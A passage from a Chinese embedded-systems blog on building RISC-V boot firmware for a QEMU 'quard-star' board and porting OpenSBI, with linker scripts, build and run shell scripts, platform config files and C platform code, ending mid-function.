<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OUTPUT_ARCH( &quot;riscv&quot; )  /*输出可执行文件平台*/</span><br><span class="line"></span><br><span class="line">ENTRY( _start )         /*程序入口函数*/</span><br><span class="line"></span><br><span class="line">MEMORY                  /*定义内存域*/</span><br><span class="line">&#123; </span><br><span class="line">    /*定义名为flash的内存域属性以及起始地址，大小等*/</span><br><span class="line">	flash (rxai!w) : ORIGIN = 0x20000000, LENGTH = 512k </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SECTIONS                /*定义段域*/</span><br><span class="line">&#123;</span><br><span class="line">  .text :               /*.text段域*/</span><br><span class="line">  &#123;</span><br><span class="line">    KEEP(*(.text))      /*将所有.text段链接在此域内，keep是保持防止优化，即无论如何都保留此段*/</span><br><span class="line">  &#125; &gt;flash              /*段域的地址(LMA和VMA相同)位于名为flash内存域*/</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>build.sh</p>
<p>这里交叉编译器使用<code>riscv64-unknown-elf-gcc</code> 用于编译面向RISC-V 64位架构的ELF（可执行和可链接格式）目标文件。这个前缀表示，你正在使用的是针对RISC-V架构未知操作系统（ELF）的GCC编译器。</p>
<ul>
<li>制作固件，我们的pflash为32M，因此flash固件比较为32M，我们生成一个32文件，空余位置暂时先填充0，这样就得到了fw.bin固件</li>
</ul>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">CROSS_PREFIX=riscv64-unknown-elf</span><br><span class="line">if [ ! -d &quot;$SHELL_FOLDER/output/lowlevelboot&quot; ]; then  </span><br><span class="line">mkdir $SHELL_FOLDER/output/lowlevelboot</span><br><span class="line">fi  </span><br><span class="line">cd boot</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">CROSS_PREFIX-gcc -x assembler-with-cpp -c start.s -o <span class="variable">$SHELL_FOLDER</span>/output/lowlevelboot/start.o</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">CROSS_PREFIX-gcc -nostartfiles -T./boot.lds -Wl,-Map=<span class="variable">$SHELL_FOLDER</span>/output/lowlevelboot/lowlevel_fw.map -Wl,--gc-sections <span class="variable">$SHELL_FOLDER</span>/output/lowlevelboot/start.o -o <span class="variable">$SHELL_FOLDER</span>/output/lowlevelboot/lowlevel_fw.elf</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用gnu工具生成原始的程序bin文件</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">CROSS_PREFIX-objcopy -O binary -S <span class="variable">$SHELL_FOLDER</span>/output/lowlevelboot/lowlevel_fw.elf <span class="variable">$SHELL_FOLDER</span>/output/lowlevelboot/lowlevel_fw.bin</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用gnu工具生成反汇编文件，方便调试分析（当然我们这个代码太简单，不是很需要）</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">CROSS_PREFIX-objdump --<span class="built_in">source</span> --demangle --disassemble --reloc --wide <span class="variable">$SHELL_FOLDER</span>/output/lowlevelboot/lowlevel_fw.elf &gt; <span class="variable">$SHELL_FOLDER</span>/output/lowlevelboot/lowlevel_fw.lst</span></span><br><span class="line"></span><br><span class="line">cd $SHELL_FOLDER/output/lowlevelboot</span><br><span class="line">rm -rf fw.bin</span><br><span class="line">dd of=fw.bin bs=1k count=32k if=/dev/zero</span><br><span class="line">dd of=fw.bin bs=1k conv=notrunc seek=0 if=lowlevel_fw.bin</span><br></pre></td></tr></table></figure>







<blockquote>
<p>run.sh</p>
<ul>
<li>加载固件运行qemu仿真，向之前run.sh脚本添加-drive if&#x3D;pflash的参数就可以将固件配置到模拟器的固件加载位置，根据之前qemu内的路径就可以加载执行固件内的代码。</li>
</ul>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SHELL_FOLDER=$(cd &quot;$(dirname &quot;$0&quot;)&quot;;pwd)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">SHELL_FOLDER/output/qemu/bin/qemu-system-riscv64 \</span></span><br><span class="line"><span class="language-bash">-M quard-star \</span></span><br><span class="line"><span class="language-bash">-m 1G \</span></span><br><span class="line"><span class="language-bash">-smp 8 \</span></span><br><span class="line"><span class="language-bash">-bios none \</span></span><br><span class="line"><span class="language-bash"><span class="comment">#-monitor stdio \</span></span></span><br><span class="line"><span class="language-bash">-drive <span class="keyword">if</span>=pflash,bus=0,unit=0,format=raw,file=<span class="variable">$SHELL_FOLDER</span>/output/lowlevelboot/fw.bin \</span></span><br><span class="line"><span class="language-bash">-nographic --parallel none</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>sudo .&#x2F;build.sh</p>
<p>sudo .&#x2F;run.sh</p>
</blockquote>
<p><img src="/2024/06/04/riscv-3-%E6%B5%8B%E8%AF%95%E4%B8%B2%E5%8F%A3%E6%89%93%E5%8D%B0/image-20240605202837030.png" alt="image-20240605202837030"></p>
<h1 id="3-问题"><a href="#3-问题" class="headerlink" title="3.问题"></a>3.问题</h1><blockquote>
<p>注意安装riscv64交叉编译环境的时候汇报这个错误，可能要指明使用的lib路径</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">CROSS_PREFIX-gcc -L/opt/riscv/riscv64-unknown-elf/lib -L/opt/riscv/lib -x assembler-with-cpp -c start.s -o <span class="variable">$SHELL_FOLDER</span>/output/lowlevelboot/start.o</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">CROSS_PREFIX-gcc -L/opt/riscv/riscv64-unknown-elf/lib -L/opt/riscv/lib</span></span><br></pre></td></tr></table></figure>


</blockquote>
<p><img src="/2024/06/04/riscv-3-%E6%B5%8B%E8%AF%95%E4%B8%B2%E5%8F%A3%E6%89%93%E5%8D%B0/image-20240604194042617.png" alt="image-20240604194042617"></p>
<blockquote>
<p>报错</p>
<p>.&#x2F;run.sh: 9: -drive: not found</p>
<p>原因是上面命令有注释然后命令断开了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SHELL_FOLDER=$(cd &quot;$(dirname &quot;$0&quot;)&quot;;pwd)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">SHELL_FOLDER/output/qemu/bin/qemu-system-riscv64 \</span></span><br><span class="line"><span class="language-bash">-M quard-star \</span></span><br><span class="line"><span class="language-bash">-m 1G \</span></span><br><span class="line"><span class="language-bash">-smp 8 \</span></span><br><span class="line"><span class="language-bash">-bios none \</span></span><br><span class="line"><span class="language-bash">-drive <span class="keyword">if</span>=pflash,bus=0,unit=0,format=raw,file=<span class="variable">$SHELL_FOLDER</span>/output/lowlevelboot/fw.bin \</span></span><br><span class="line"><span class="language-bash">-nographic --parallel none</span></span><br></pre></td></tr></table></figure>
</blockquote>
]]></content>
      <categories>
        <category>riscv</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>riscv，qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>riscv-4-opensbi</title>
    <url>/2024/06/06/riscv-4-opensbi/</url>
    <content><![CDATA[<h1 id="1-riscv的多级启动引导流程介绍"><a href="#1-riscv的多级启动引导流程介绍" class="headerlink" title="1.riscv的多级启动引导流程介绍"></a>1.riscv的多级启动引导流程介绍</h1><p>之前的步骤都是板子的一些外设添加以及，上一节写了个简单的固件程序，目前已经实现了板子的cpu，MROM，SRAM，FLASH，DDR，UART和RTC</p>
<img src="/2024/06/06/riscv-4-opensbi/image-20240606105450786.png" alt="image-20240606105450786" style="zoom: 67%;">



<blockquote>
<p>参考：</p>
<ol>
<li><a href="https://blog.csdn.net/flyfish1986/article/details/131043405">RISC-V体系结构的U-Boot引导过程_riscv uboot-CSDN博客</a></li>
<li><a href="https://www.cnblogs.com/cfas/p/16880724.html">RISC-V启动引导流程 spec - 方东信 - 博客园 (cnblogs.com)</a></li>
<li><a href="https://github.com/wangzhou/notes/blob/master/%E5%A4%9A%E6%A0%B8%E5%90%AF%E5%8A%A8%E5%9F%BA%E6%9C%AC%E9%80%BB%E8%BE%91">notes&#x2F;多核启动基本逻辑 at master · wangzhou&#x2F;notes (github.com)</a></li>
</ol>
</blockquote>
<p><strong>三种主要的操作模式</strong>，riscv 规范定义了三种主要的操作模式</p>
<ol>
<li>U模式（用户模式），运行用户程序的模式，权限级别最低。不能直接访问I&#x2F;O或特权指令或内核内存或其他进程。</li>
<li>S模式（管理模式），大多数Linux内核或其他O&#x2F;S运行的模式。通过I&#x2F;O remap函数访问最特权的指令和I&#x2F;O控制。内存管理单元可能打开或关闭。</li>
<li>M模式（机器模式），机器模式:裸机程序&#x2F;第一阶段引导加载程序和FSBL（First Stage Bootloader ）在此模式下运行。FSBL以固件的形式存在</li>
</ol>
<blockquote>
<p>固件：固件（Firmware）是一种嵌入在硬件设备中的软件，用于控制硬件的功能和操作。<strong>它介于硬件和高级软件（如操作系统和应用程序）之间，提供基本的硬件抽象和控制。</strong> 通常存在ROM或者EEPROM，例如BIOS 或者 UEFI等，</p>
</blockquote>
<p><strong>uboot</strong> 可以运行在M模式或者 S模式下， 取决于它是否在SBI的固件初始化之前运行。</p>
<ol>
<li><code>SBI</code>Supervisor Binary Interface 是 S模式 和SEE之间的<strong>调用约定&#x2F;接口。</strong>SEE&#96;Supervisor Execution Environment  S执行环境 ，其<strong>调用风格就像System call</strong>一样。OpenSBI是一个SBI实现，可以在不同的模式下与U-Boot一起使用。</li>
<li><code>opensbi</code> RISC-V Open Source Supervisor Binary Interface</li>
<li>如下图，ABI 是 应用与 S模式之间的接口约定， SBI 是 S模式与 M模式之间的接口约定</li>
</ol>
<p><img src="/2024/06/06/riscv-4-opensbi/image-20240606114347807.png" alt="image-20240606114347807"></p>
<p><strong>多级启动流程</strong></p>
<p><img src="/2024/06/06/riscv-4-opensbi/image-20240606115629524.png" alt="image-20240606115629524"></p>
<ul>
<li>实线箭头代表加载的操作</li>
<li>虚线箭头代表跳转操作</li>
</ul>
<p><strong>流程</strong>：</p>
<ol>
<li>ROM上的代码负责对电源，时钟进行初始化设置，并且将loader的代码加载到SRAM上并跳转执行LOADER    —- 对应到<code>riscv_setup_rom_reset_vec</code></li>
<li>LOADER 初始化DDR（其实也是一种ram），然后加载opensbi 固件到ddr，也可以直接跳转到bootloader执行</li>
<li>最后bootloader会加载os 并执行</li>
</ol>
<p><img src="/2024/06/06/riscv-4-opensbi/image-20240606143633584.png" alt="流程引导的每个模式"></p>
<ol>
<li>每个步骤运行在哪个模式下，</li>
<li>zsbl<code>Zero Stage Boot Loader</code>，运行在M模式下，事实上我们在qemu中是通过drive 将固件直接加载到了flash的地方，所以rom上不需要执行加载的操作</li>
<li>fsbl，运行在M模式下，这里需要加载 opensbi固件，加载设备树，然后跳转opensbi执行</li>
<li>opensbi，执行在M模式下</li>
<li>跳转执行uboot执行在S模式下</li>
<li>os 运行在 S模式下</li>
</ol>
<p><img src="/2024/06/06/riscv-4-opensbi/image-20240606152715952.png" alt="image-20240606152715952"></p>
<p><strong>内存布局</strong></p>
<blockquote>
<p>qemu模拟的riscv中，多核启动的流程都是先多个核竞争一个主核，由主核对共享资源进行初始化，然后其余从核进行自身的初始化</p>
<p><code>riscv_setup_rom_reset_vec</code> 用于设置 RISC-V 处理器的复位向量地址。复位向量是处理器在复位（重启）后执行的第一条指令的地址。该函数通常用于配置处理器的启动过程，确保处理器在复位后从正确的地址开始执行代码。</p>
<p><strong>fw_dynamic_info</strong> 结构体，这个结构体 包含了下一个阶段程序启动的地址，魔数，下一阶段CPU位于 S模式，初始化完毕后又调用<code>rom_add_blob_fixed_as</code>函数将<code>fw_dynamic_info</code>拷贝到rom的<code>reset_vec</code>之后，用于下一阶段的启动</p>
</blockquote>
<p>此时内存的布局是这样的：</p>
<p><img src="/2024/06/06/riscv-4-opensbi/image-20240606151519375.png" alt="image-20240606151519375"></p>
<p> 上一章节，将启动固件加载在<strong>flash</strong>后的内存布局：</p>
<p><img src="/2024/06/06/riscv-4-opensbi/image-20240606152341573.png" alt="image-20240606152341573"></p>
<p><img src="/2024/06/06/riscv-4-opensbi/image-20240606153011137.png" alt="image-20240606153011137"></p>
<h1 id="2-Opensbi介绍"><a href="#2-Opensbi介绍" class="headerlink" title="2.Opensbi介绍"></a>2.Opensbi介绍</h1><p><code>SBI</code>指的是 Supervisor Binary Interface，<strong>运行在 M模式下的程序，操作系统（S模式）通过SBI 来调用M模式的硬件资源 相当于上层系统运行时的系统调用</strong> opensbi是一种开源sbi的实现 </p>
<ul>
<li><code>FW_PAYLOAD</code> ：下一引导阶段被作为 payload 打包进来，通常是 U-Boot 或 Linux。这是兼容 Linux 的 RISC-V 硬件所使用的默认 firmware 。</li>
<li><code>FW_JUMP</code> ：不直接包含下一个阶段的代码，跳转到一个固定地址，该地址上需存有下一个加载器。QEMU 的早期版本曾经使用过它。</li>
<li><code>FW_DYNAMIC</code> ：带有动态信息的固件，根据前一个阶段传入的信息加载下一个阶段。通常是 U-Boot SPL 使用它。现在 QEMU 默认使用 FW_DYNAMIC。</li>
</ul>
<blockquote>
<p>opensbi源码下载：<a href="https://github.com/riscv-software-src/opensbi/releases">Releases · riscv-software-src&#x2F;opensbi (github.com)</a></p>
<p>下载1.2版本。</p>
<p>当前版本opensbi开发者倾向于不要让ic设计尚加入太多的板级支持代码，因此opensbi本身也需要加载一份设备树文件，<strong>opensbi通过解析设备树文件了解soc内部的硬件结构</strong>，进而使用标准的驱动代码对其进行配置使用。</p>
</blockquote>
<p>因此我们目前可以确认：</p>
<ol>
<li>首先系统从MROM 启动– BL0</li>
<li>然后跳转到 flash 的首地址 执行上一节编写的 lowlevelboot 程序 – BL1</li>
<li>然后将 flash 上的 opensbi程序和 所需要的设备树资源文件加载到ddr上并跳转执行 – BL2</li>
</ol>
<blockquote>
<p><a href="https://quard-star-tutorial.readthedocs.io/zh-cn/latest/ch5-2.html">基于qemu-riscv从0开始构建嵌入式linux系统ch5-2. 什么是多级BootLoader与opensbi(下) — 主页 (quard-star-tutorial.readthedocs.io)</a></p>
<p>设备树：设备树是从linux内核中广泛使用的一种设备描述文件，可以简化驱动代码的编写并提高驱动代码的复用率移植性，因此逐渐扩展到各个嵌入式平台级代码项目中</p>
</blockquote>
<p>opensbi中<code>fw_base.S</code>汇编文件正是opensbi的启动所在</p>
<ol>
<li>.<code>entry</code>段<code>_start</code>符号即为链接脚本中第一个代码段，上级loader程序加载完成后自然跳转到该地址指令执行。</li>
<li>首先启动代码进行判断非boot核心跳转<code>_wait_for_boot_hart</code>等待，boot核心先进行一次代码<code>_relocate</code>，可以发现如果<code>opensbi</code>如果不在自己的链接地址内运行，则会实现自身代码的拷贝到目标<code>ram</code>上运行，因此可以以类似<code>spl</code>的方式从<code>flash</code>中启动。当然我们因为已经使用了自己编写的loader程序，这段<code>_relocate</code>不会执行，</li>
<li>之后的流程是<code>.bss</code>段的清零和<code>SP</code>指针的初始化。接下来就是调用<code>fw_platform_init</code>函数，注意此时传入参数<code>a0——hart id</code>，<code>a1——fdt</code>地址，a2，a3，a4均为上级loader程序的传入参数，这个函数由platform来实现如果不使用则该函数由弱定义空函数来代替，platform函数具体内容我们后面实现时再来看，此处暂时跳过。</li>
<li>接下来就是<code>_scratch_init</code>函数，<code>scratch</code>你可以认为就是另一个<code>sp</code>指针的东西，定义了一片内存用来存放一些数据，同栈一样，先进后出。<code>_scratch_init</code>其实是按顺序写入了<code>sbi</code>下一级程序的地址参数等信息，由工程内的预定于宏指定，其实这里对我们作用不大，因为<strong>我们使用设备树文件提供给opensbi来解析得到下一级启动地址等信息</strong>。</li>
<li>在向下就是<code>_fdt_reloc</code>，和代码<code>reloc</code>类似，对<code>fdt</code>进行，我们的设计不会执行到这个，最后来到了<code>_start_warm</code>，此时boot核心将标志释放，其余等待在<code>_wait_for_boot_hart</code>的核心也将要跳转到<code>_start_warm</code>。_<code>start_warm</code>针对每一个核心复位寄存器建立自己的栈空间，配置<code>trap</code>异常等完成后调用<code>sbi_init</code>离开汇编代码的世界。</li>
</ol>
<p><img src="/2024/06/06/riscv-4-opensbi/image-20240606210704400.png" alt="image-20240606210704400"></p>
<h1 id="3-Opensbi的移植"><a href="#3-Opensbi的移植" class="headerlink" title="3.Opensbi的移植"></a>3.Opensbi的移植</h1><p>需要明确的：</p>
<ul>
<li>采用<code>opensbi</code>的固件是<code>FW_JUMP</code>，会被加载到<code>DRAM0x80000000</code> 处执行</li>
<li>需要编写设备树编译将设备树的地址传递给<code>Opensbi</code>，<code>rom</code>上的<code>fw_dynamic_info</code>用不到</li>
<li>需要编写在<code>flash</code>上运行代码将<code>opensbi</code>的固件加载到<code>DRAM</code>处 然后跳转执行</li>
</ul>
<p>使用<code>tree -d -L 2</code> 查看源码目录的层次</p>
<p><img src="/2024/06/06/riscv-4-opensbi/image-20240606212336666.png" alt="image-20240606212336666"></p>
<p> 要为我们的<code>quard_star</code> 板卡 新增<code>opensbi</code>的支持，如下进行操作：</p>
<ol>
<li>在 platform 文件下新建一个 名为 <code>quard_star</code>  的文件夹</li>
<li>在quard_star文件夹下新增三个文件<code>Kconfig</code>，<code>objects.mk</code>，<code>platform.c</code></li>
<li>在quard_satr文件夹下新增一个文件夹<code>configs</code>，在<code>configs</code>目录下新建一个名为<code>defconfig</code>的文件</li>
</ol>
<p>新增完的目录如下：</p>
<p><img src="/2024/06/06/riscv-4-opensbi/image-20240606213048514.png" alt="image-20240606213048514"></p>
<blockquote>
<p>quard_star&#x2F;Kconfig</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># SPDX-License-Identifier: BSD-2-Clause</span><br><span class="line"></span><br><span class="line">config PLATFORM_QUARD_STAR</span><br><span class="line">	bool</span><br><span class="line">	select FDT  </span><br><span class="line">	select FDT_DOMAIN </span><br><span class="line">	select FDT_PMU</span><br><span class="line">	default y</span><br></pre></td></tr></table></figure>



<blockquote>
<p>quard_star&#x2F;objects.mk</p>
<p>配置固件为 jump 已经jump跳转地址</p>
</blockquote>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># SPDX-License-Identifier: BSD-2-Clause</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Compiler flags</span></span><br><span class="line">platform-cppflags-y =</span><br><span class="line">platform-cflags-y =</span><br><span class="line">platform-asflags-y =</span><br><span class="line">platform-ldflags-y =</span><br><span class="line"></span><br><span class="line"><span class="comment"># Objects to build</span></span><br><span class="line">platform-objs-y += platform.o</span><br><span class="line"></span><br><span class="line"><span class="comment"># Blobs to build</span></span><br><span class="line">FW_JUMP=y</span><br><span class="line">FW_TEXT_START=0x80000000</span><br><span class="line">FW_JUMP_ADDR=0x0</span><br></pre></td></tr></table></figure>



<blockquote>
<p>quard_star&#x2F;configs&#x2F;defconfig</p>
<p>指定配置需要哪些硬件</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CONFIG_PLATFORM_ALLWINNER_D1=y</span><br><span class="line">CONFIG_PLATFORM_ANDES_AE350=y</span><br><span class="line">CONFIG_PLATFORM_RENESAS_RZFIVE=y</span><br><span class="line">CONFIG_PLATFORM_SIFIVE_FU540=y</span><br><span class="line">CONFIG_PLATFORM_SIFIVE_FU740=y</span><br><span class="line">CONFIG_FDT_GPIO=y</span><br><span class="line">CONFIG_FDT_GPIO_SIFIVE=y</span><br><span class="line">CONFIG_FDT_I2C=y</span><br><span class="line">CONFIG_FDT_I2C_SIFIVE=y</span><br><span class="line">CONFIG_FDT_IPI=y</span><br><span class="line">CONFIG_FDT_IPI_MSWI=y</span><br><span class="line">CONFIG_FDT_IPI_PLICSW=y</span><br><span class="line">CONFIG_FDT_IRQCHIP=y</span><br><span class="line">CONFIG_FDT_IRQCHIP_APLIC=y</span><br><span class="line">CONFIG_FDT_IRQCHIP_IMSIC=y</span><br><span class="line">CONFIG_FDT_IRQCHIP_PLIC=y</span><br><span class="line">CONFIG_FDT_RESET=y</span><br><span class="line">CONFIG_FDT_RESET_ATCWDT200=y</span><br><span class="line">CONFIG_FDT_RESET_GPIO=y</span><br><span class="line">CONFIG_FDT_RESET_HTIF=y</span><br><span class="line">CONFIG_FDT_RESET_SIFIVE_TEST=y</span><br><span class="line">CONFIG_FDT_RESET_SUNXI_WDT=y</span><br><span class="line">CONFIG_FDT_RESET_THEAD=y</span><br><span class="line">CONFIG_FDT_SERIAL=y</span><br><span class="line">CONFIG_FDT_SERIAL_CADENCE=y</span><br><span class="line">CONFIG_FDT_SERIAL_GAISLER=y</span><br><span class="line">CONFIG_FDT_SERIAL_HTIF=y</span><br><span class="line">CONFIG_FDT_SERIAL_RENESAS_SCIF=y</span><br><span class="line">CONFIG_FDT_SERIAL_SHAKTI=y</span><br><span class="line">CONFIG_FDT_SERIAL_SIFIVE=y</span><br><span class="line">CONFIG_FDT_SERIAL_LITEX=y</span><br><span class="line">CONFIG_FDT_SERIAL_UART8250=y</span><br><span class="line">CONFIG_FDT_SERIAL_XILINX_UARTLITE=y</span><br><span class="line">CONFIG_FDT_TIMER=y</span><br><span class="line">CONFIG_FDT_TIMER_MTIMER=y</span><br><span class="line">CONFIG_FDT_TIMER_PLMT=y</span><br><span class="line">CONFIG_SERIAL_SEMIHOSTING=y</span><br></pre></td></tr></table></figure>



<blockquote>
<p>quard_star&#x2F;platform.c</p>
<p>设备树的理解：<a href="https://zhuanlan.zhihu.com/p/644652123">【Linux内核|驱动模型】设备树的展开unflatten_device_tree - 知乎 (zhihu.com)</a></p>
<p><code>fw_platform_init</code> 函数，注意此时传入参数<code>a0——hart id</code>，<code>a1——fdt</code>地址，a2，a3，a4均为上级loader程序的传入参数。</p>
</blockquote>
<p>函数逻辑：</p>
<ol>
<li>首先，通过解析设备树来获取平台的模型名称（”model” 属性），并将其存储在 <code>platform.name</code> 变量中。</li>
<li>接下来，在设备树的 “&#x2F;<code>cpus</code>” 路径下遍历处理器节点，获取每个处理器的 <code>hartid</code>（处理器标识符）。</li>
<li>根据获取的 <code>hartid</code>，将其存储在 <code>quard_star_hart_index2id</code> 数组中，并增加 <code>hart_count</code> 变量的计数。</li>
<li>最后，设置 <code>platform.hart_count</code> 变量为 <code>hart_count</code>，表示平台上处理器的数量。</li>
<li>函数返回 arg1，即原始的设备树指针。</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">fw_platform_init</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> arg0, <span class="type">unsigned</span> <span class="type">long</span> arg1,</span></span><br><span class="line"><span class="params">				<span class="type">unsigned</span> <span class="type">long</span> arg2, <span class="type">unsigned</span> <span class="type">long</span> arg3,</span></span><br><span class="line"><span class="params">				<span class="type">unsigned</span> <span class="type">long</span> arg4)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *model;</span><br><span class="line">	<span class="type">void</span> *fdt = (<span class="type">void</span> *)arg1;</span><br><span class="line">	u32 hartid, hart_count = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> rc, root_offset, cpus_offset, cpu_offset, len;</span><br><span class="line"></span><br><span class="line">	root_offset = fdt_path_offset(fdt, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (root_offset &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> fail;</span><br><span class="line">	<span class="comment">// 获取平台模型名称</span></span><br><span class="line">	model = fdt_getprop(fdt, root_offset, <span class="string">&quot;model&quot;</span>, &amp;len);</span><br><span class="line">	<span class="keyword">if</span> (model)</span><br><span class="line">		sbi_strncpy(platform.name, model, <span class="keyword">sizeof</span>(platform.name));</span><br><span class="line"></span><br><span class="line">	cpus_offset = fdt_path_offset(fdt, <span class="string">&quot;/cpus&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (cpus_offset &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> fail;</span><br><span class="line"></span><br><span class="line">	fdt_for_each_subnode(cpu_offset, fdt, cpus_offset) &#123;</span><br><span class="line">		rc = fdt_parse_hart_id(fdt, cpu_offset, &amp;hartid);</span><br><span class="line">		<span class="keyword">if</span> (rc)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (SBI_HARTMASK_MAX_BITS &lt;= hartid)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		quard_star_hart_index2id[hart_count++] = hartid;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	platform.hart_count = hart_count;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Return original FDT pointer */</span></span><br><span class="line">	<span class="keyword">return</span> arg1;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">		wfi();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<blockquote>
<p>platform_ops 结构体 其结构体类型为<code>const struct sbi_platform_operations</code>，用于指定平台的相关的操作函数</p>
<p>每个成员对应一个平台相关的操作函数，<strong>用于在opensbi初始化过程中进行特定的操作和配置，每个函数在相应的阶段被调用，以完成平台相关的初始化，配置和资源管理等工作</strong></p>
<p>拓展：</p>
<p><code>.early_init</code> 使用点号（<code>.</code>）在结构体初始化时指定成员变量的名称是一种称为“<strong>指定初始化器”（Designated Initializers）的语法</strong>。<strong>这种语法允许你在初始化结构体时明确地指出要初始化的成员变量，从而提高代码的可读性和可维护性。</strong></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sbi_platform_operations</span> <span class="title">platform_ops</span> =</span> &#123;</span><br><span class="line">	.early_init		= quard_star_early_init,             	<span class="comment">//早期初始化，不需要</span></span><br><span class="line">	.final_init		= quard_star_final_init,            	<span class="comment">//最终初始化，需要</span></span><br><span class="line">	.early_exit		= quard_star_early_exit,            	<span class="comment">//早期退出，不需要</span></span><br><span class="line">	.final_exit		= quard_star_final_exit,            	<span class="comment">//最终退出，不需要</span></span><br><span class="line">	.domains_init	= quard_star_domains_init,      		<span class="comment">//从设备树填充域，需要</span></span><br><span class="line">	.console_init	= fdt_serial_init,              		<span class="comment">//初始化控制台</span></span><br><span class="line">	.irqchip_init	= fdt_irqchip_init,             		<span class="comment">//初始化中断</span></span><br><span class="line">	.irqchip_exit	= fdt_irqchip_exit,             		<span class="comment">//中断退出</span></span><br><span class="line">	.ipi_init		= fdt_ipi_init,                     	<span class="comment">//中断通信</span></span><br><span class="line">	.ipi_exit		= fdt_ipi_exit,</span><br><span class="line">	.pmu_init		= quard_star_pmu_init,              	<span class="comment">//电源配置</span></span><br><span class="line">	.pmu_xlate_to_mhpmevent = quard_star_pmu_xlate_to_mhpmevent,</span><br><span class="line">	.get_tlbr_flush_limit	= quard_star_tlbr_flush_limit, 	<span class="comment">//需要</span></span><br><span class="line">	.timer_init		= fdt_timer_init,					</span><br><span class="line">	.timer_exit		= fdt_timer_exit,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>每个函数的定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">quard_star_early_init</span><span class="params">(<span class="type">bool</span> cold_boot)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">quard_star_final_init</span><span class="params">(<span class="type">bool</span> cold_boot)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">void</span> *fdt;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (cold_boot)</span><br><span class="line">		fdt_reset_init();</span><br><span class="line">	<span class="keyword">if</span> (!cold_boot)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	fdt = sbi_scratch_thishart_arg1_ptr();</span><br><span class="line"></span><br><span class="line">	fdt_cpu_fixup(fdt);</span><br><span class="line">	fdt_fixups(fdt);</span><br><span class="line">	fdt_domain_fixup(fdt);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">quard_star_early_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">quard_star_final_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">quard_star_domains_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> fdt_domains_populate(fdt_get_address());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">quard_star_pmu_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> fdt_pmu_setup(fdt_get_address());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title 